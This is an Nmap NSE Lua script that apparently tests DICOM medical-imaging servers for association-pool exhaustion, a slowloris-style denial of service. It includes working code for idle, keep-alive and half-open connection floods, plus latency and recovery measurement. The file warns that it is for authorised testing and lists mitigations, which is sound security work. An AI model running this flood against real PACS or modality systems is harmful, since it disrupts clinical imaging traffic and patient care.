local shortport = require "shortport"
local stdnse = require "stdnse"
local nmap = require "nmap"
local string = require "string"
local math = require "math"
local table = require "table"
local dicom = require "dicom"

description = [[
DICOM association-exhaustion (slowloris-style) denial-of-service probe.

Tests whether a DICOM SCP can be driven into association-pool exhaustion, a
slowloris-like attack adapted to the DICOM Upper Layer protocol (PS3.8). A DICOM
server must keep state for every established association until it is released
(A-RELEASE) or aborted (A-ABORT), and most PACS / VNA / modality software caps
concurrent associations (commonly 10-50). A client that opens associations and
holds them -- idle, drip-fed, or half-open -- can fill that pool and lock out
legitimate SCUs (modalities, workstations, gateways).

Attack modes:
  * "idle"    (default) complete the A-ASSOCIATE handshake and hold it open
              with no DIMSE traffic (PS3.8 has no mandatory idle timeout).
  * "echo"    complete the handshake and send a periodic C-ECHO keep-alive to
              defeat ARTIM / proprietary idle timers.
  * "partial" open TCP and send only the first bytes of an A-ASSOCIATE-RQ, so
              the server's ARTIM timer holds the socket while it waits for the
              rest -- exhaustion before a single association even completes.

Rather than flipping on one failed probe, the script:
  * measures a baseline association latency first, and rejects the run if the
    server already refuses this calling AE (AE whitelist) or is down;
  * fills the pool in waves, and after each wave records the probe latency and
    counts how many held associations are still alive (so a server that quietly
    drops half-open sockets is detected, not mistaken for a full pool);
  * requires several consecutive unavailable probes before declaring
    exhaustion, and classifies the failure (TCP refused vs accepted-but-
    unanswered) to point at the limit that broke;
  * reports a graded verdict -- VULNERABLE (full exhaustion), DEGRADED (latency
    rose sharply but never fully failed), or NOT VULNERABLE -- plus the recovery
    time after release.

WARNING: this is a denial-of-service test. A successful run disrupts clinical
DICOM traffic (store, query, retrieve). Run it only against systems you are
explicitly authorised to test, in a controlled window.

Requires the dicom.lua library (place in nselib/ or same directory).
]]

---
-- @usage
-- nmap -p4242 --script dicom-slowloris \
--   --script-args 'dicom-slowloris.called_ae=ORTHANC' <target>
--
-- @usage
-- nmap -p4242 --script dicom-slowloris \
--   --script-args 'dicom-slowloris.mode=echo,dicom-slowloris.connections=200' \
--   <target>
--
-- @usage
-- nmap -p2762 --script dicom-slowloris --script-args 'dicom.tls=true' <target>
--
-- @args dicom-slowloris.called_ae       Target AE Title. Default: "ANY-SCP"
-- @args dicom-slowloris.calling_ae      Our AE Title. Default: "NMAP-SLOW"
-- @args dicom-slowloris.connections     Max connections to open. Default: 50
-- @args dicom-slowloris.mode            "idle", "echo" or "partial".
--                                       Default: "idle"
-- @args dicom-slowloris.wave_size       Connections per wave. Default: 10
-- @args dicom-slowloris.wave_delay      Seconds between waves. Default: 1
-- @args dicom-slowloris.echo_interval   Seconds between C-ECHO keep-alives
--                                       (echo mode). Default: 5
-- @args dicom-slowloris.hold_time       Seconds to hold after exhaustion.
--                                       Default: 10
-- @args dicom-slowloris.timeout         Connection/DIMSE timeout. Default: 10
-- @args dicom-slowloris.max_pdu         Max PDU length. Default: 16384
-- @args dicom-slowloris.partial_bytes   Bytes to send in partial mode.
--                                       Default: 32
-- @args dicom-slowloris.confirm         Consecutive failed probes required to
--                                       confirm exhaustion. Default: 2
-- @args dicom-slowloris.degrade_factor  Latency multiple over baseline that
--                                       counts as degraded. Default: 10
-- @args dicom-slowloris.baseline_samples Probes used to set the baseline.
--                                       Default: 3
-- @args dicom-slowloris.vary_ae         Vary calling AE per connection.
--                                       Default: false
-- @args dicom.tls                       Force transport: "true"/"false"/unset.
--
-- @output
-- PORT     STATE SERVICE
-- 4242/tcp open  dicom
-- | dicom-slowloris:
-- |   Mode: idle   Target AE: ORTHANC   Calling AE: NMAP-SLOW
-- |   Baseline association latency: 6 ms
-- |   Phase 1 - Filling association pool:
-- |     Wave 1: +10 opened (10 held, 10 alive, 0 failed) probe ok 7 ms
-- |     Wave 2: +10 opened (20 held, 20 alive, 0 failed) probe ok 41 ms
-- |     Wave 3: +8 opened, 2 refused (28 held, 28 alive) probe timeout
-- |     Exhaustion confirmed at 28 associations (2 consecutive failures)
-- |   Failure mode: connections accepted but unanswered (pool saturation)
-- |   Latency under load: 6 ms baseline -> 41 ms peak before failure
-- |   Phase 2 - Holding (10s): held 28, still alive 28 at end
-- |   Phase 3 - Release and recovery: server available 1.2s after release
-- |   Results:
-- |     VULNERABLE: association-pool exhaustion confirmed
-- |     Exhaustion threshold: 28 concurrent associations
-- |     Recovery: 1.2s after release
-- |_    Mitigation: ARTIM/idle timeout, per-source limits, rate limiting
--
-- @xmloutput
-- <elem key="verdict">VULNERABLE</elem>
-- <elem key="threshold">28</elem>
-- <elem key="failure_mode">timeout</elem>
-- <elem key="baseline_ms">6</elem>
---

author = "Paulino Calderon <paulino@calderonpale.com>"
license = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}

portrule = shortport.port_or_service({104, 2762, 11112, 4242}, "dicom", "tcp",
  "open")

local VERIF = "1.2.840.10008.1.1"

local function get_arg(key, default)
  return stdnse.get_script_args("dicom-slowloris." .. key) or default
end

--- Median of a numeric list (returns nil for an empty list).
local function median(t)
  if #t == 0 then return nil end
  local s = {}
  for _, v in ipairs(t) do s[#s + 1] = v end
  table.sort(s)
  local m = math.floor((#s + 1) / 2)
  if #s % 2 == 1 then return s[m] end
  return (s[m] + s[m + 1]) / 2
end

--- Classify a do_associate failure reason into a probe status.
-- A-ASSOCIATE-RJ is split by cause: a presentation-service-provider rejection
-- (source 3) means "temporary congestion" / "local limit exceeded" -- the
-- server refusing new work because its pool is full, which IS the exhaustion
-- condition. A service-user rejection (source 1: AE title / protocol) means the
-- server is alive and refusing this configuration, not exhausted.
local function classify(reason)
  reason = tostring(reason or "")
  if reason:find("CONN_REFUSED") then return "refused" end
  if reason:find("TIMEOUT") or reason:find("NO_DATA") then return "timeout" end
  if reason:find("RESET") then return "reset" end
  local src = reason:match("REJECT%(result=%d+,source=(%d+),")
  if src then
    return tonumber(src) == 3 and "limit" or "rejected"
  end
  if reason:find("REJECT") then return "rejected" end
  if reason:find("ABORT") then return "abort" end
  return "error"
end

--- Probe the server with a fresh association (+ C-ECHO).
-- @return status ("ok"/"rejected"/"refused"/"timeout"/"reset"/"error"), ms
-- "ok" and "rejected" both mean the server is alive and servicing TCP; the
-- rest mean it is not answering new associations.
local function probe(host, port, called_ae, calling_ae, timeout_s)
  local t0 = nmap.clock_ms()
  local ok, sock, pctxs = dicom.do_associate(host, port, called_ae, calling_ae,
    {VERIF}, 16384, timeout_s)
  if not ok then
    return classify(sock), nmap.clock_ms() - t0
  end
  local pctx = dicom.pick_accepted_pctx(pctxs)
  if pctx then
    dicom.send_dimse(sock, pctx, dicom.build_cecho_rq(99), nil, 16384)
    local pt, ce = dicom.recv_dimse(sock, timeout_s)
    dicom.do_release(sock, 2)
    if pt and ce and ce["0000,0900"] then
      return "ok", nmap.clock_ms() - t0
    end
    return "timeout", nmap.clock_ms() - t0
  end
  dicom.do_release(sock, 2)
  return "ok", nmap.clock_ms() - t0
end

local function is_alive(status)
  return status == "ok" or status == "rejected"
end

--- Heuristic liveness check on a held socket without disturbing the hold.
-- A short read that times out means the socket is still open; EOF/reset, or an
-- A-ABORT PDU (type 0x07) coming back, means the server tore it down.
local function sock_alive(sock)
  if not sock then return false end
  sock:set_timeout(60)
  local st, data = sock:receive_bytes(1)
  if st then
    return not (data and #data > 0 and string.byte(data, 1) == 0x07)
  end
  return tostring(data or ""):find("TIMEOUT") ~= nil
end

--- Count (and prune) still-alive held sockets.
local function count_alive(socks)
  local alive = 0
  for i = 1, #socks do
    if socks[i] then
      if sock_alive(socks[i]) then
        alive = alive + 1
      else
        pcall(function() socks[i]:close() end)
        socks[i] = false
      end
    end
  end
  return alive
end

--- Open one held connection per mode. Returns socket+pctx_id, or nil+err.
local function open_conn(host, port, mode, called_ae, calling_ae, max_pdu,
    timeout_s, partial_bytes)
  if mode == "partial" then
    local sock = dicom.new_sock(timeout_s)
    local ok = dicom.tcp_connect(sock, host, port)
    if not ok then sock:close() return nil, nil, "CONN_REFUSED" end
    local full = dicom.build_assoc_rq(called_ae, calling_ae, {VERIF}, max_pdu)
    -- Keep at least the 6-byte PDU header so the server commits to reading the
    -- declared length and blocks waiting for the remainder.
    local n = math.max(math.min(partial_bytes, #full), 6)
    ok = dicom.tcp_send(sock, full:sub(1, n))
    if not ok then sock:close() return nil, nil, "SEND_FAILED" end
    return sock, nil, nil
  end
  local ok, sock, pctxs = dicom.do_associate(host, port, called_ae, calling_ae,
    {VERIF}, max_pdu, timeout_s)
  if not ok then return nil, nil, tostring(sock) end
  local pctx = dicom.pick_accepted_pctx(pctxs)
  if mode == "echo" and not pctx then
    dicom.do_release(sock, 2)
    return nil, nil, "no accepted presentation context"
  end
  return sock, pctx, nil
end

--- Send a keep-alive C-ECHO; return true if the association answered.
local function keepalive(sock, pctx, msg_id, max_pdu, timeout_s)
  if not sock or not pctx then return false end
  local ok = dicom.send_dimse(sock, pctx, dicom.build_cecho_rq(msg_id), nil,
    max_pdu)
  if not ok then return false end
  local pt, ce = dicom.recv_dimse(sock, timeout_s)
  return pt and ce and ce["0000,0900"] ~= nil
end

action = function(host, port)
  local called_ae = get_arg("called_ae", "ANY-SCP")
  local calling_ae = get_arg("calling_ae", "NMAP-SLOW")
  local max_conns = tonumber(get_arg("connections", "50")) or 50
  local mode = get_arg("mode", "idle"):lower()
  local wave_size = tonumber(get_arg("wave_size", "10")) or 10
  local wave_delay = tonumber(get_arg("wave_delay", "1")) or 1
  local echo_interval = tonumber(get_arg("echo_interval", "5")) or 5
  local hold_time = tonumber(get_arg("hold_time", "10")) or 10
  local timeout_s = tonumber(get_arg("timeout", "10")) or 10
  local max_pdu = tonumber(get_arg("max_pdu", "16384")) or 16384
  local partial_bytes = tonumber(get_arg("partial_bytes", "32")) or 32
  local confirm = tonumber(get_arg("confirm", "2")) or 2
  local degrade_factor = tonumber(get_arg("degrade_factor", "10")) or 10
  local baseline_samples = tonumber(get_arg("baseline_samples", "3")) or 3
  local vary_ae = get_arg("vary_ae", "false"):lower() == "true"

  local out = stdnse.output_table()
  if mode ~= "idle" and mode ~= "echo" and mode ~= "partial" then
    out["Error"] = "Invalid mode '" .. mode .. "' (use idle, echo, partial)"
    return out
  end
  out["Mode"] = string.format("%s   Target AE: %s   Calling AE: %s",
    mode, called_ae, calling_ae)

  -- Baseline: measure normal latency and confirm the server services our AE.
  local base = {}
  local last_status
  for _ = 1, math.max(baseline_samples, 1) do
    local st, ms = probe(host, port, called_ae, calling_ae, timeout_s)
    last_status = st
    if is_alive(st) then base[#base + 1] = ms end
  end
  local baseline_ms = median(base)
  if not baseline_ms then
    if last_status == "refused" or last_status == "timeout" then
      out["Error"] = "Server not reachable/answering before the test ("
        .. last_status .. ") - it may already be down"
    else
      out["Error"] = string.format(
        "Server did not accept an association from calling AE '%s' (%s) - if "
        .. "an AE whitelist is in force, set dicom-slowloris.calling_ae to a "
        .. "known AE", calling_ae, tostring(last_status))
    end
    return out
  end
  out["Baseline association latency"] = string.format("%.0f ms", baseline_ms)

  -- Phase 1: fill the pool in waves.
  local socks, pctxs = {}, {}
  local opened, failed = 0, 0
  local fill = {}
  local exhausted, threshold, fail_mode = false, 0, nil
  local peak_ms = baseline_ms
  local consec = 0
  local wave = 0

  while opened < max_conns and not exhausted do
    wave = wave + 1
    local w_open, w_fail, w_refused = 0, 0, 0
    for _ = 1, wave_size do
      if opened >= max_conns then break end
      local conn_ae = calling_ae
      if vary_ae and opened > 0 then
        local suffix = tostring(opened % 1000)
        conn_ae = calling_ae:sub(1, math.max(16 - #suffix, 1)) .. suffix
      end
      local s, pctx, err = open_conn(host, port, mode, called_ae, conn_ae,
        max_pdu, timeout_s, partial_bytes)
      if s then
        socks[#socks + 1] = s
        pctxs[#socks] = pctx
        opened = opened + 1
        w_open = w_open + 1
      else
        failed = failed + 1
        w_fail = w_fail + 1
        if tostring(err):find("REFUSED") then w_refused = w_refused + 1 end
      end
    end

    local alive = count_alive(socks)
    local st, ms = probe(host, port, called_ae, calling_ae, timeout_s)
    local probe_txt
    if is_alive(st) then
      consec = 0
      if ms > peak_ms then peak_ms = ms end
      probe_txt = string.format("probe ok %.0f ms", ms)
    else
      consec = consec + 1
      fail_mode = st
      probe_txt = "probe " .. st
    end

    local refused_txt = w_refused > 0
      and string.format(", %d refused", w_refused) or ""
    fill[#fill + 1] = string.format(
      "Wave %d: +%d opened%s (%d held, %d alive, %d failed) %s",
      wave, w_open, refused_txt, opened, alive, failed, probe_txt)

    if consec >= confirm then
      exhausted = true
      threshold = alive
      fill[#fill + 1] = string.format(
        "Exhaustion confirmed at %d associations (%d consecutive failures)",
        threshold, consec)
    elseif not exhausted and wave_delay > 0 then
      stdnse.sleep(wave_delay)
    end
  end
  out["Phase 1 - Filling association pool"] = fill

  -- Interpret the failure mode / degradation.
  local degraded = (not exhausted)
    and peak_ms >= baseline_ms * degrade_factor and peak_ms >= 1000
  if exhausted then
    if fail_mode == "limit" then
      out["Failure mode"] =
        "server rejected new associations with local-limit-exceeded"
        .. " (A-ASSOCIATE-RJ: association pool full)"
    elseif fail_mode == "refused" or fail_mode == "reset" then
      out["Failure mode"] =
        "new connections refused at TCP layer (listener backlog / max-clients)"
    else
      out["Failure mode"] =
        "connections accepted but unanswered (worker/thread-pool saturation)"
    end
  end
  out["Latency under load"] = string.format(
    "%.0f ms baseline -> %.0f ms peak%s", baseline_ms, peak_ms,
    exhausted and " before failure" or "")

  -- Phase 2: hold and monitor.
  if exhausted and hold_time > 0 then
    local start = nmap.clock_ms()
    local elapsed, next_echo, echoes, drops = 0, echo_interval, 0, 0
    local recovered = false
    while elapsed < hold_time do
      if mode == "echo" and elapsed >= next_echo then
        for i = 1, #socks do
          if socks[i] then
            echoes = echoes + 1
            if not keepalive(socks[i], pctxs[i], echoes, max_pdu, timeout_s)
            then
              pcall(function() socks[i]:close() end)
              socks[i] = false
              drops = drops + 1
            end
          end
        end
        next_echo = elapsed + echo_interval
      end
      local st = probe(host, port, called_ae, calling_ae, timeout_s)
      if is_alive(st) then recovered = true break end
      stdnse.sleep(1)
      elapsed = (nmap.clock_ms() - start) / 1000
    end
    local alive = count_alive(socks)
    if recovered then
      out["Phase 2 - Holding"] = string.format(
        "server recovered after %.0fs while %d connections were still held",
        elapsed, alive)
    else
      local extra = mode == "echo"
        and string.format(", %d echoes, %d dropped", echoes, drops) or ""
      out["Phase 2 - Holding"] = string.format(
        "held %.0fs: %d still alive at end%s", hold_time, alive, extra)
    end
  elseif not exhausted then
    out["Phase 2 - Holding"] = "skipped (server not exhausted)"
  end

  -- Phase 3: release and measure recovery.
  local released = 0
  for i = 1, #socks do
    if socks[i] then
      if mode == "partial" then
        pcall(function() socks[i]:close() end)
      else
        pcall(function() dicom.do_release(socks[i], 2) end)
      end
      released = released + 1
    end
  end
  local rec_start = nmap.clock_ms()
  local recovery
  if exhausted then
    for _ = 1, 15 do
      stdnse.sleep(1)
      if is_alive((probe(host, port, called_ae, calling_ae, timeout_s))) then
        recovery = (nmap.clock_ms() - rec_start) / 1000
        break
      end
    end
    out["Phase 3 - Release and recovery"] = recovery
      and string.format("released %d; server available %.1fs after release",
        released, recovery)
      or string.format(
        "released %d; server still unavailable after 15s (may need restart)",
        released)
  else
    out["Phase 3 - Release and recovery"] =
      string.format("released %d connections", released)
  end

  -- Results.
  local results = {}
  if exhausted then
    results[#results + 1] = "VULNERABLE: association-pool exhaustion confirmed"
    results[#results + 1] = string.format(
      "Exhaustion threshold: %d concurrent associations", threshold)
    results[#results + 1] = recovery
      and string.format("Recovery: %.1fs after release", recovery)
      or "Recovery: not within 15s (may require a restart)"
    if mode == "echo" then
      results[#results + 1] = "Note: C-ECHO keep-alives defeated idle timeout"
        .. " - needs per-source limits, not just an idle timeout"
    elseif mode == "partial" then
      results[#results + 1] = "Note: half-open A-ASSOCIATE-RQ (ARTIM) attack"
        .. " - lower the ARTIM timeout and add TCP rate limiting"
    else
      results[#results + 1] = "Mitigation: ARTIM/idle timeout, per-source"
        .. " limits, rate limiting"
    end
  elseif degraded then
    results[#results + 1] = string.format(
      "DEGRADED: association latency rose from %.0f ms to %.0f ms (%.0fx)"
      .. " under %d held connections without full exhaustion",
      baseline_ms, peak_ms, peak_ms / baseline_ms, opened)
    results[#results + 1] = "Partial DoS: service is impaired but not fully"
      .. " blocked; raise dicom-slowloris.connections to push further"
  else
    results[#results + 1] = string.format(
      "NOT VULNERABLE: server serviced probes with %d associations held"
      .. " (pool may be larger or unlimited)", opened)
    results[#results + 1] = string.format(
      "Try raising dicom-slowloris.connections (current: %d)", max_conns)
  end
  out["Results"] = results

  nmap.set_port_version(host, port, "hardmatched")
  return out
end
